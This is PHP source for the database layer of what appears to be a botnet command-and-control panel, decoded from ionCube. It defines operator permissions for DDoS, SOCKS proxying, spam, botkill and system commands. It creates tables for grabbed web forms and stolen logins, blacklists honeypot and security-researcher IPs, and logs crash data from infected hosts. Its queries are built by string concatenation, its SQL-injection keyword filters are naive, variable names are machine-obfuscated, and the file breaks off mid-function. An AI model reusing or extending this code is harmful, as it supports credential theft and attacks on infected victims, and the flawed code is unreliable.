<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

if (!defined("IN_CORE_INC")) {
    exit("..");
}
define("SQL_COMPONENT_VERSION", "1.0.0.0");
define("IN_SQL_INC", "TRUE");
define("BLACKLIST_REASON_SUSPICIOUS", 1);
define("BLACKLIST_REASON_HONEYPOT", 2);
define("BLACKLIST_REASON_OTHER", 3);
define("BLACKLIST_REASON_SQLI", 4);
define("BLACKLIST_REASON_LOGIN", 5);
define("EVENT_OPTION_ENABLED", 1);
define("EVENT_OPTION_E_LOGINS", 2);
define("EVENT_OPTION_E_SETTINGS", 4);
define("EVENT_OPTION_E_TASKS", 8);
define("EVENT_OPTION_E_USERS", 16);
define("EVENT_OPTION_MASK_IPS", 32);
define("EVENT_OPTION_E_USER_MODIFIED", 64);
define("EVENT_OPTION_E_TASK_EDIT", 128);
define("EVENT_OPTION_E_TASK_DELETE", 256);
define("EVENT_OPTION_E_DB_WIPED_RECORDS", 512);
define("EVENT_OPTION_E_FORMS_MODIFIED_FILTERS", 1024);
define("EVENT_OPTION_E_GRABBER_STATUS_CHANGED", 2048);
define("EVENT_OPTION_E_FILE_SEARCH_UPDATED", 4096);
define("EVENT_TYPE_UNKNOWN", 0);
define("EVENT_TYPE_LOGIN", 1);
define("EVENT_TYPE_SETTINGS_CHANGE", 2);
define("EVENT_TYPE_NEW_TASK", 3);
define("EVENT_TYPE_USER_CREATION", 4);
define("EVENT_TYPE_USER_MODIFIED", 5);
define("EVENT_TYPE_TASK_EDIT", 6);
define("EVENT_TYPE_TASK_DELETE", 7);
define("EVENT_TYPE_DB_WIPED_RECORDS", 8);
define("EVENT_TYPE_FORMS_MODIFIED_FILTERS", 9);
define("EVENT_TYPE_GRABBER_STATUS_CHANGED", 10);
define("EVENT_TYPE_FILE_SEARCH_UPDATED", 11);
define("USER_PRIVILEGES_CREATE_USERS", 1);
define("USER_PRIVILEGES_CREATE_TASKS", 2);
define("USER_PRIVILEGES_VIEW_BOT_INFO", 4);
define("USER_PRIVILEGES_VIEW_LOGS", 8);
define("USER_PRIVILEGES_EDIT_SETTINGS", 16);
define("USER_PRIVILEGES_DELETE_TASK", 32);
define("USER_PRIVILEGES_EDIT_TASK", 64);
define("USER_PRIVILEGES_CMD_DOWNLOAD", 128);
define("USER_PRIVILEGES_CMD_UPDATE", 256);
define("USER_PRIVILEGES_CMD_DDOS", 512);
define("USER_PRIVILEGES_CMD_VIEW_URL", 1024);
define("USER_PRIVILEGES_CMD_BOTKILL", 2048);
define("USER_PRIVILEGES_CMD_SOCKS", 4096);
define("USER_PRIVILEGES_CMD_HOMEPAGE", 8192);
define("USER_PRIVILEGES_CMD_CLEAR_COOKIES", 16384);
define("USER_PRIVILEGES_CMD_UNINSTALL", 32768);
define("USER_PRIVILEGES_CMD_TERMINATE", 65536);
define("USER_PRIVILEGES_CMD_SPAM", 131072);
define("USER_PRIVILEGES_MANAGE_PLUGINS", 262144);
define("USER_PRIVILEGES_CMD_SYSTEM", 524288);
define("USER_PRIVILEGES_MANAGE_NOTICES", 16777216);
define("USER_PRIVILEGES_ALL", USER_PRIVILEGES_CREATE_USERS | USER_PRIVILEGES_CREATE_TASKS | USER_PRIVILEGES_VIEW_BOT_INFO | USER_PRIVILEGES_VIEW_LOGS | USER_PRIVILEGES_EDIT_SETTINGS | USER_PRIVILEGES_DELETE_TASK | USER_PRIVILEGES_EDIT_TASK | USER_PRIVILEGES_CMD_DOWNLOAD | USER_PRIVILEGES_CMD_UPDATE | USER_PRIVILEGES_CMD_DDOS | USER_PRIVILEGES_CMD_VIEW_URL | USER_PRIVILEGES_CMD_BOTKILL | USER_PRIVILEGES_CMD_SOCKS | USER_PRIVILEGES_CMD_HOMEPAGE | USER_PRIVILEGES_CMD_CLEAR_COOKIES | USER_PRIVILEGES_CMD_UNINSTALL | USER_PRIVILEGES_CMD_TERMINATE | USER_PRIVILEGES_CMD_SPAM | USER_PRIVILEGES_MANAGE_NOTICES | USER_PRIVILEGES_CMD_SYSTEM | USER_PRIVILEGES_MANAGE_PLUGINS);
define("REQUIRED_TASKS_TABLE_COLUMNS", 21);
define("REQUIRED_CLIENTS_TABLE_COLUMNS", 54);
define("REQUIRED_GRABBED_FORMS_TABLE_COLUMNS", 12);
define("REQUIRED_GRABBED_LOGINS_TABLE_COLUMNS", 10);
define("REQUIRED_SETTINGS_TABLE_COLUMNS", 31);
define("DEBUG_REQUEST_TYPE_CRASH_REPORT", 0);
define("DEBUG_REQUEST_TYPE_DEBUG_MSGS", 1);
class CSqlWrap
{
    protected $sql_link = NULL;
    public $pdbname = SQL_DATABASE;
    public function Connect()
    {
        $this->sql_link = mysql_connect(SQL_SERVER . ":" . SQL_PORT, SQL_USERNAME, SQL_PASSWORD);
        return $this->sql_link;
    }
    public function ConnectWithDb($db_name)
    {
        if (strlen($db_name) == 0) {
            return NULL;
        }
        if ($this->sql_link = $this->Connect()) {
            mysql_select_db("\$db_name", $this->sql_link);
        }
        return $this->sql_link;
    }
    public function SetInternalLink($int_link)
    {
        $this->sql_link = $int_link;
    }
    public function GetInternalLink($int_link)
    {
        return $this->sql_link;
    }
    public function Close()
    {
    }
    public function Query($query_str)
    {
        if (strlen($query_str) < 3) {
            return NULL;
        }
        if ($this->sql_link) {
            return mysql_query($query_str);
        }
    }
    public function SetEncoding($encoding_name)
    {
        if ($this->sql_link && strlen($encoding_name)) {
            mysql_set_charset((string) $encoding_name);
            return true;
        }
        return false;
    }
    public function CheckQueryForSQLi($query_str)
    {
        if ($query_str && (strpos($query_str, "'") || strpos($query_str, "\""))) {
            return true;
        }
        return false;
    }
    public function CheckStringForAttackString($s_target_string = "")
    {
        if (@strlen($s_target_string) < 3) {
            return false;
        }
        $_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_ = @strtoupper(@urldecode($s_target_string));
        if (strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "INSERT ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "DROP ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "SELECT ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "FROM ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "DELETE ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "UPDATE ")) {
            return true;
        }
        return false;
    }
    public function CheckStringForAttackString_Post($s_target_string = "")
    {
        if (@strlen($s_target_string) < 3) {
            return false;
        }
        $_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_ = @strtoupper(@urldecode($s_target_string));
        if ($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_ != NULL && (strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "INSERT ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "SELECT ") || strstr($_obfuscated_0D363B0A091D2A2E152D220D18353E17232A051B5C2A22_, "UPDATE "))) {
            return true;
        }
        return false;
    }
    public function NumRows($sql_query)
    {
        if ($sql_query) {
            return mysql_num_rows($sql_query);
        }
    }
    public function Error()
    {
        return mysql_error($this->sql_link);
    }
    public function __construct()
    {
        $this->sql_link = NULL;
    }
    public function __destruct()
    {
        $this->Close();
    }
}
class CPanelAdmins extends CSqlWrap
{
    public function GetUserById($user_id)
    {
        $_obfuscated_0D1505081B28022F390B0C0E010C050D350F3529303411_ = (int) $user_id;
        return parent::Query("SELECT * FROM " . $this->pdbname . ".admins WHERE id = '" . $_obfuscated_0D1505081B28022F390B0C0E010C050D350F3529303411_ . "' LIMIT 1");
    }
    public function GetUserByName($user_name)
    {
        $user_name = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($user_name);
        return parent::Query("SELECT * FROM " . $this->pdbname . ".admins WHERE username = '" . $user_name . "' LIMIT 1");
    }
    public function HashPasswordWithSalt($password)
    {
        return sha1(SQL_PASSWORD_SALT . $password);
    }
    public function GetUserIfLoginIsOK($login_username, $login_password_hash)
    {
        if (strlen($login_username) == 0 || strlen($login_password_hash) == 0) {
            return NULL;
        }
        $login_username = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($login_username);
        $_obfuscated_0D080A1D2C3C06302933171228161A31033C1E170B1601_ = $this->HashPasswordWithSalt($login_password_hash);
        return parent::Query("SELECT * FROM " . $this->pdbname . ".admins WHERE username = '" . $login_username . "' AND password_hash = '" . $_obfuscated_0D080A1D2C3C06302933171228161A31033C1E170B1601_ . "' LIMIT 1");
    }
    public function AddUser($username, $password, $priv_mask, $options)
    {
        if (strlen($username) == 0 || strlen($password) == 0) {
            return NULL;
        }
        $_obfuscated_0D30141B32241B0C102710403F2E091C250133280F1B32_ = $username;
        $username = bin2hex($username);
        $_obfuscated_0D0A085B180E0E403D0A3519242B352C141921085C2401_ = $this->HashPasswordWithSalt($password);
        if (parent::NumRows(parent::Query("SELECT id FROM " . $this->pdbname . ".admins WHERE username = UNHEX('" . $username . "') LIMIT 1"))) {
            return NULL;
        }
        $_obfuscated_0D2A340D191F3D1B1B1A02020E1E0C1A173230373E3301_ = parent::Query("INSERT INTO " . $this->pdbname . ".admins VALUES(NULL, UNHEX('" . $username . "'), '" . $_obfuscated_0D0A085B180E0E403D0A3519242B352C141921085C2401_ . "', '" . $priv_mask . "', '" . $options . "', '0', 'sortie_status', 'ASC', '25')");
        if (!mysql_errno()) {
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_USER_CREATION, "Name of new user: " . $_obfuscated_0D30141B32241B0C102710403F2E091C250133280F1B32_);
        }
        return $_obfuscated_0D2A340D191F3D1B1B1A02020E1E0C1A173230373E3301_;
    }
    public function SetUserSortOptions($username, $sort_type, $sort_order, $sort_max_view_per_page)
    {
        if (strlen($sort_type) == 0 || strlen($sort_order) == 0 || $sort_max_view_per_page === 0) {
            return NULL;
        }
        $sort_type = bin2hex($sort_type);
        $sort_order = bin2hex($sort_order);
        $username = bin2hex($username);
        return parent::Query("UPDATE " . $this->pdbname . ".admins SET sort_type=UNHEX('" . $sort_type . "'), sort_order=UNHEX('" . $sort_order . "'), sort_max_per_page='" . $sort_max_view_per_page . "' WHERE username = UNHEX('" . $username . "') LIMIT 1");
    }
    public function DeleteUserByUserName($username)
    {
        if (strlen($username) == 0) {
            return NULL;
        }
        $username = bin2hex($username);
        return parent::Query("DELETE FROM " . $this->pdbname . ".admins WHERE username = UNHEX('" . $username . "')");
    }
    public function DeleteUserById($userid)
    {
        if (is_numeric($userid) == false) {
            return NULL;
        }
        $_obfuscated_0D30310D1F07322723193B2E2738403818221D5B150601_ = (int) $userid;
        return parent::Query("DELETE FROM " . $this->pdbname . ".admins WHERE id = '" . $_obfuscated_0D30310D1F07322723193B2E2738403818221D5B150601_ . "'");
    }
    public function UpdateLastLogin($username)
    {
        if (strlen($username) == 0) {
            return NULL;
        }
        $username = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($username);
        return parent::Query("UPDATE " . $this->pdbname . ".admins SET lastlogin=UNIX_TIMESTAMP(NOW()) WHERE username = '" . $username . "' LIMIT 1");
    }
    public function IsUsernameOK($username)
    {
        $_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_ = strlen($username);
        if ($_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_ < 1 || 16 <= $_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_) {
            return false;
        }
        if (!@ctype_alnum($username)) {
            return false;
        }
        return true;
    }
    public function IsPasswordOK($passw)
    {
        $_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_ = strlen($passw);
        if ($_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_ < 5 || 24 < $_obfuscated_0D2E11163F02340825390E31222A2B02360C5C1C162222_) {
            return false;
        }
        return true;
    }
    public function GetUsers()
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".admins");
    }
}
class CPanelBlacklist extends CSqlWrap
{
    public function IsValidIP($ip_address = 0)
    {
        if (!$ip_address || is_numeric($ip_address) == false) {
            return false;
        }
        return true;
    }
    public function GetStringFromReasonId($reason_code)
    {
        switch ($reason_code) {
            case BLACKLIST_REASON_SUSPICIOUS:
                return "IP was found visiting links with invalid parameters or behaving in an otherwise suspicious manner.";
            case BLACKLIST_REASON_HONEYPOT:
                return "IP is a known honeypot / security researcher-related host.";
            case BLACKLIST_REASON_OTHER:
                return "IP may have been manually added.";
            case BLACKLIST_REASON_SQLI:
                return "IP was detected attempting to use SQLi attack strings.";
        }
        return "Unknown reason.";
    }
    public function AddBlacklistedIP($ip_address = 0, $reason_id)
    {
        if ($this->IsValidIP($ip_address) == false) {
            return NULL;
        }
        if ($this->IsIPBlacklisted($ip_address)) {
            return NULL;
        }
        $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ = sprintf("%u", $ip_address);
        return parent::Query("INSERT INTO " . $this->pdbname . ".blacklist VALUES(NULL, '" . $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ . "', '" . $reason_id . "', UNIX_TIMESTAMP(NOW()))");
    }
    public function IsTORIP($ip_address = 0)
    {
        if ($this->IsValidIP($ip_address) == false) {
            return 0;
        }
        $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ = sprintf("%u", $ip_address);
        $_obfuscated_0D3E3C363F3337291312011B01370C0726152827191622_ = 0;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT node_ip FROM " . $this->pdbname . ".tor_ips WHERE node_ip = '" . $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ . "' LIMIT 1");
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            $_obfuscated_0D3E3C363F3337291312011B01370C0726152827191622_ = (int) @mysql_num_rows();
        }
        return $_obfuscated_0D3E3C363F3337291312011B01370C0726152827191622_;
    }
    public function GetBlockedTorHostCount()
    {
        $_obfuscated_0D1B3815230C351339261C40291619101F3D33402E1222_ = 0;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT num_visits FROM " . $this->pdbname . ".tor_ips WHERE num_visits > 0");
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            while ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = mysql_fetch_assoc($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_)) {
                if (isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["num_visits"])) {
                    $_obfuscated_0D1B3815230C351339261C40291619101F3D33402E1222_ += (int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["num_visits"];
                }
            }
        }
        return $_obfuscated_0D1B3815230C351339261C40291619101F3D33402E1222_;
    }
    public function GetNumBlockedTorIps()
    {
        $_obfuscated_0D3936151E1A0D313F2D0F030225051210402221170601_ = 0;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(num_visits) FROM " . $this->pdbname . ".tor_ips");
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            list($_obfuscated_0D3936151E1A0D313F2D0F030225051210402221170601_) = @mysql_fetch_row($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return $_obfuscated_0D3936151E1A0D313F2D0F030225051210402221170601_;
    }
    public function IsIPBlacklisted($ip_address = 0)
    {
        if ($this->IsValidIP($ip_address) == false) {
            return NULL;
        }
        $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ = sprintf("%u", $ip_address);
        return parent::NumRows(parent::Query("SELECT id FROM " . $this->pdbname . ".blacklist WHERE host = '" . $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ . "' LIMIT 1"));
    }
    public function DeleteBlacklistedIP($ip_address = 0)
    {
        if ($this->IsValidIP($ip_address) == false) {
            return NULL;
        }
        $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ = sprintf("%u", $ip_address);
        return parent::Query("DELETE FROM " . $this->pdbname . ".blacklist WHERE host = '" . $_obfuscated_0D1A2F37111D252A26230415373B1932021B1E371C0232_ . "' LIMIT 1");
    }
    public function GetAllEntries()
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".blacklist");
    }
    public function ClearList()
    {
        return parent::Query("TRUNCATE TABLE " . $this->pdbname . ".blacklist");
    }
}
class CGeoIP extends CSqlWrap
{
    public function GetGeoRecordsCount()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(IP_FROM) FROM " . $this->pdbname . ".geoip");
        $_obfuscated_0D3C060B19261A283C373428371A040D300B3C3C383C11_ = 0;
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            list($_obfuscated_0D3C060B19261A283C373428371A040D300B3C3C383C11_) = @mysql_fetch_row($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return (int) $_obfuscated_0D3C060B19261A283C373428371A040D300B3C3C383C11_;
    }
    public function GetIpLocation($ip_string)
    {
        $_obfuscated_0D161736312109033C2826320123274038321423143611_ = strlen($ip_string);
        if (16 < $_obfuscated_0D161736312109033C2826320123274038321423143611_ || $_obfuscated_0D161736312109033C2826320123274038321423143611_ < 7) {
            return NULL;
        }
        $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ = sprintf("%u", @ip2long($ip_string));
        return @mysql_fetch_assoc(@parent::Query("SELECT COUNTRY_CODE2, COUNTRY_NAME FROM " . $this->pdbname . ".geoip WHERE IP_FROM <= " . $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ . " AND IP_TO >= " . $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ . " LIMIT 1"));
    }
    public function GetIso2CountryCodeFromIP($ip_string = "")
    {
        if (@strlen($ip_string) < 4) {
            return "";
        }
        $_obfuscated_0D1128282D2D051D301F032B1116351425354004140C01_ = "";
        $_obfuscated_0D0A083F2804191C280D16392B0A32325C122105100511_ = $this->GetIpLocation($ip_string);
        if ($_obfuscated_0D0A083F2804191C280D16392B0A32325C122105100511_ != NULL && isset($_obfuscated_0D0A083F2804191C280D16392B0A32325C122105100511_["COUNTRY_CODE2"])) {
            $_obfuscated_0D1128282D2D051D301F032B1116351425354004140C01_ = $_obfuscated_0D0A083F2804191C280D16392B0A32325C122105100511_["COUNTRY_CODE2"];
        }
        return $_obfuscated_0D1128282D2D051D301F032B1116351425354004140C01_;
    }
    public function GetLocationFromIso2Code($iso2_code)
    {
        if (@strlen($iso2_code) != 2) {
            return "";
        }
        return @mysql_fetch_assoc(@parent::Query("SELECT COUNTRY_CODE2, COUNTRY_NAME FROM " . $this->pdbname . ".geoip WHERE COUNTRY_CODE2 = '" . $iso2_code . "' LIMIT 1"));
    }
    public function IsExtendedGeoInfoAvailable()
    {
        $_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_ = 0;
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = parent::Query("SELECT COUNT(locID) FROM " . $this->pdbname . ".geoip_city");
        if ($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_) {
            list($_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_) = @mysql_fetch_row($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
            @mysql_free_result($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        }
        if ($_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_ < 3500) {
            return false;
        }
        $_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_ = 0;
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = parent::Query("SELECT COUNT(locID) FROM " . $this->pdbname . ".geoip_city_ips");
        if ($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_) {
            list($_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_) = @mysql_fetch_row($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
            @mysql_free_result($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        }
        if ($_obfuscated_0D110D2B100C11225C022C5C231E283F053F370F2C2801_ < 3500) {
            return false;
        }
        return true;
    }
    public function GetCityInfoFromIP($ip_string)
    {
        if (strlen($ip_string) < 4) {
            return "";
        }
        $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ = sprintf("%u", @ip2long($ip_string));
        $_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_ = parent::Query("SELECT a.country, a.city, a.region, a.postalCode, a.areaCode, a.locID, b.locID FROM " . $this->pdbname . ".geoip_city AS a LEFT JOIN " . $this->pdbname . ".geoip_city_ips AS b ON a.locID=b.locID WHERE " . $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ . " BETWEEN b.startIPNum AND b.endIPNum");
        if ($_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_) {
            return mysql_fetch_assoc($_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_);
        }
    }
    public function GetASNInfoFromIP($ip_string)
    {
        if (@strlen($ip_string) < 4) {
            return "";
        }
        $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ = sprintf("%u", @ip2long($ip_string));
        $_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_ = parent::Query("SELECT asn_name FROM " . $this->pdbname . ".geoip_asn WHERE " . $_obfuscated_0D24360E032D0B0B0C1B2116372A5C101B3F182E130332_ . " BETWEEN ip_begin AND ip_end");
        if ($_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_) {
            return @mysql_fetch_assoc($_obfuscated_0D2F042F3F2B2A22062B1E3102111808290D3F3D0F3411_);
        }
    }
    public function GetFlagPath($iso2_code = "")
    {
        if (strlen($iso2_code) != 2) {
            return "";
        }
        $_obfuscated_0D2E5B03031D3827393B34260936031507323B1D091332_ = false;
        $_obfuscated_0D175B0F092F071F071132213D180A1A3E391C230F3432_ = DIR_FLAGS . "/" . @strtolower($iso2_code) . ".png";
        if ($iso2_code == "GF" || $iso2_code == "A2" || $iso2_code == "MF") {
            $_obfuscated_0D2E5B03031D3827393B34260936031507323B1D091332_ = true;
        }
        if (!file_exists($_obfuscated_0D175B0F092F071F071132213D180A1A3E391C230F3432_) || $_obfuscated_0D2E5B03031D3827393B34260936031507323B1D091332_ === true) {
            $_obfuscated_0D175B0F092F071F071132213D180A1A3E391C230F3432_ = DIR_FLAGS . "/_commonwealth.png";
        }
        return $_obfuscated_0D175B0F092F071F071132213D180A1A3E391C230F3432_;
    }
}
class CLoginTries extends CSqlWrap
{
    public function AddAttempt($ip_addr = 0)
    {
        return parent::Query("INSERT INTO " . $this->pdbname . ".login_tries VALUES(NULL, '" . $ip_addr . "', UNIX_TIMESTAMP(NOW()))");
    }
    public function CountTriesWithin10($ip_addr = 0)
    {
        $_obfuscated_0D333F191C0332323C2E0433252423293935063E221B11_ = (int) (@time() - 60 * 10);
        $_obfuscated_0D4033230E14392E123D30042D2B3E220D3B395C063632_ = 0;
        $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_ = parent::Query("SELECT id FROM " . $this->pdbname . ".login_tries WHERE attempt_date > " . $_obfuscated_0D333F191C0332323C2E0433252423293935063E221B11_);
        if ($_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_) {
            $_obfuscated_0D4033230E14392E123D30042D2B3E220D3B395C063632_ = (int) @mysql_num_rows($_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_);
            @mysql_free_result($_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_);
        }
        return $_obfuscated_0D4033230E14392E123D30042D2B3E220D3B395C063632_;
    }
    public function ClearOldEntries()
    {
        $_obfuscated_0D333F191C0332323C2E0433252423293935063E221B11_ = (int) (@time() - 60 * 15);
        return parent::Query("DELETE FROM " . $this->pdbname . ".login_tries WHERE attempt_date < " . $_obfuscated_0D333F191C0332323C2E0433252423293935063E221B11_);
    }
    public function DeleteByIP($ip_addr = 0)
    {
        return parent::Query("DELETE FROM " . $this->pdbname . ".login_tries WHERE ip_address = " . $ip_addr);
    }
}
class CDebug extends CSqlWrap
{
    public $InstanceType = DEBUG_REQUEST_TYPE_CRASH_REPORT;
    public $szBotGUID = "";
    public $szGroupName = "";
    public $dwFlags = 0;
    public $ulSystemTime = 0;
    public $dwOSFlags = 0;
    public $pvNtdllBaseAddress = 0;
    public $pvKernel32BaseAddress = 0;
    public $pvUser32BaseAddress = 0;
    public $pvAdvapi32BaseAddress = 0;
    public $pvWininetBaseAddress = 0;
    public $pvWs2_32BaseAddress = 0;
    public $pvCrypt32BaseAddress = 0;
    public $Secur32BaseAddress = 0;
    public $dwProcessId = 0;
    public $dwThreadId = 0;
    public $dwThreadLastError = 0;
    public $dwHooks = 0;
    public $pvBaseAddress = 0;
    public $uBotImageSize = 0;
    public $pvHookCustomNtCallsBaseAddress = 0;
    public $pvHookSavedCodeBaseAddress = 0;
    public $szProcessName = "";
    public $dwBotInitStatus = 0;
    public $lNumActiveC2Requests = 0;
    public $lNumberOfPersistFileRestores = 0;
    public $lNumberOfActiveDownloadTasks = 0;
    public $lNumberOfActiveBotkillTasks = 0;
    public $Context_Dr0 = 0;
    public $Context_Dr1 = 0;
    public $Context_Dr2 = 0;
    public $Context_Dr3 = 0;
    public $Context_Dr6 = 0;
    public $Context_Dr7 = 0;
    public $Context_Edi = 0;
    public $Context_Esi = 0;
    public $Context_Ebx = 0;
    public $Context_Edx = 0;
    public $Context_Ecx = 0;
    public $Context_Eax = 0;
    public $Context_Ebp = 0;
    public $Context_Eip = 0;
    public $Context_Esp = 0;
    public $szEip_ModuleName = "";
    public $dwNumberOfNestedExceptions = 0;
    public $szExceptionModuleName = "";
    public $Record_ExceptionCode = 0;
    public $Record_ExceptionFlags = 0;
    public $Record_ExceptionAddress = 0;
    public $Record_NumberParameters = 0;
    public $Record_ExParam1 = 0;
    public $Record_ExParam2 = 0;
    public $Record_ExParam3 = 0;
    public $Record_ExParam4 = 0;
    public $Record_ExParam5 = 0;
    public function GetCountAndFreeResult($query_res = NULL)
    {
        $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_ = 0;
        if ($query_res) {
            list($_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_) = @mysql_fetch_row($query_res);
            @mysql_free_result($query_res);
        }
        return $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_;
    }
    public function FormatGroupQueryString($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = "";
        if (isset($groupname) && 0 < strlen($groupname)) {
            $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = " AND GroupName='" . _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($groupname) . "'";
        }
        return $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_;
    }
    public function AddDebugMessage($bot_guid, $bot_group, $bot_os, $msg_type, $msg_flags, $msg_save_date, $msg_text)
    {
        if (strlen($msg_text) == 0) {
            return NULL;
        }
        $_obfuscated_0D1D0B3E3E0C3C2215181428152B1D08210B09303D2622_ = bin2hex($msg_text);
        $_obfuscated_0D180928161A2732210A3B303F1B213E2528155C3B2722_ = bin2hex($bot_group);
        return parent::Query("INSERT INTO " . $this->pdbname . ".debug_info VALUES(NULL, UNHEX('" . $bot_guid . "'), UNHEX('" . $_obfuscated_0D180928161A2732210A3B303F1B213E2528155C3B2722_ . "'), '" . $bot_os . "', '" . $msg_type . "', UNHEX('" . $_obfuscated_0D1D0B3E3E0C3C2215181428152B1D08210B09303D2622_ . "'), UNIX_TIMESTAMP(NOW()), '" . $msg_save_date . "', '" . $msg_flags . "')");
    }
    public function GetDebugMessageCounts($include_all_bots, $group, &$total_count, &$count_24h, &$count_7d, &$count_W8, &$count_W7, &$count_Vista, &$count_XP, &$count_x86, &$count_x64)
    {
        $_obfuscated_0D4033230E14392E123D30042D2B3E220D3B395C063632_ = 0;
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($group);
        $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ = "< " . BOT_STATUS_DEAD;
        if ($include_all_bots == true) {
            $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ = "< 0x99999999";
        }
        $_obfuscated_0D0B26150F3724040F150F5C2D3423291F1005190D0111_ = time() - 84600;
